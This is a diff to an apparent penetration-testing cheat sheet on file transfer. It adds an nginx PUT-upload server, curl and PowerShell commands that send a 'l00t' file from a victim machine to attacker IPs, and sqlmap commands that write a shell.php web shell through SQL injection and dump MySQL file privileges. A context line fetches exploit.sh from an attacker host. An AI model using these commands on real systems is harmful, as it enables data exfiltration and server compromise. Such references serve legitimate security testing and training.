@@ -43,6 +43,34 @@ PS C:\> net use Q: /delete
 
 `perl -e 'use File::Fetch; my $ff=File::Fetch->new(uri => "http://10.10.10.11/exploit.sh"); my $file = $ff->fetch() or die $ff->error;'`
 
+### NGINX + PUT
+
+[Picked up from here](https://www.youtube.com/watch?v=ob9SgtFm6_g) \(thanks @ippsec\), you can start a nginx server that can accept PUT requests for file transfer via HTTP:
+
+```bash
+root@kali:~ ❯ cat /etc/nginx/sites-enabled/file_upload
+server {
+    listen 8001 default_server;
+    server_name burmat.co;
+    location / {
+        root /var/www/upload/;
+        dav_methods PUT;
+    }
+}
+
+root@kali:~ ❯ service nginx start
+```
+
+Issue a `PUT` request from a remote system to upload files to `/var/www/upload` on your system:
+
+```bash
+## CURL:
+user@victim:~ ❯ curl -X PUT http://192.168.1.87:8001/l00t.txt -F "data=@/home/user/l00t.txt"
+
+## POWERSHELL
+PS C:\Users\victim> Invoke-RestMethod -Method PUT -Uri "http://10.10.14.12:8001/l00t.txt" -Body $(Get-Content l00t.txt)
+```
+
 ### Netcat File Transfer
 
 Because if Netcat is on the system, everything becomes easier:
@@ -70,6 +98,28 @@ regsvr32 /s /u C:\temp\payload.dll
 ```
 
 \(_Source:_ [_http://carnal0wnage.attackresearch.com/2017/08/certutil-for-delivery-of-files.html_](http://carnal0wnage.attackresearch.com/2017/08/certutil-for-delivery-of-files.html) __\)
+
+### SQLMAP - User w/ FILE Privileges
+
+If you have SQLi with a user account that has `FILE` privileges, you can use `sqlmap` to transfer the file to disk without formulating an `INFO FILE` query yourself:
+
+```bash
+root@kali:~ ❯ sqlmap -r inject.req --dbms "mysql" --file-write shell.php --file-dest \\inetpub\\wwwroot\\shell.php
+```
+
+To see if you have the privilege, attempt \(you might not have rights\) to dump the `user` table:
+
+```bash
+root@kali:~ ❯ sqlmap -r inj.req --dbms "mysql" -D mysql -T user -C User,File_Priv --dump
+.. SNIP ..
+[2 entries]
++---------+-----------+
+| User    | File_Priv |
++---------+-----------+
+| burmat  | Y         |
+| root    | Y         |
++---------+-----------+
+```
 
 ### XML File Creation on Target \(via copy/paste\)
 
@@ -185,12 +235,6 @@ end
 _\(originally sourced from:_ [_https://github.com/WinRb/WinRM_](https://github.com/WinRb/WinRM)_\)_
 
 ## ENUMERATION
-
-### Download Mailbox Attachments \(Exchange\)
-
-```text
-Coming Soon!
-```
 
 ### Finding Vulnerable Applications \(Linux\)
 
